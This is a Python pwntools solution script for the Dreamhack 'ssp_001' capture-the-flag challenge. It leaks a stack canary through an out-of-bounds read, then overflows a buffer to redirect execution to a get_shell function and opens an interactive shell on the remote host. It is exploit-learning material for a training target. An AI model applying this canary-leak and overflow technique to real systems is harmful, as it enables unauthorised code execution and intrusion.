from pwn import *


def main():
    proc = remote("host1.dreamhack.games", 22885)
    elf = ELF("./ssp_001")

    canary = b""
    for idx in range(3, -1, -1):
        proc.sendlineafter(b"> ", b"P")
        proc.sendlineafter(b"Element index : ", str(0x80+idx).encode())
        proc.recvuntil(b"is : ")
        canary += proc.recvline(False)
    log.info(f"{canary = }")

    payload = b"A"*0x40
    payload += p32(int(canary, 16))
    payload += b"A"*8
    payload += p32(elf.symbols["get_shell"])

    proc.sendlineafter(b"> ", b"E")
    proc.sendlineafter(b"Name Size : ", str(len(payload)).encode())
    proc.sendafter(b"Name : ", payload)

    proc.interactive()


if __name__ == "__main__":
    main()
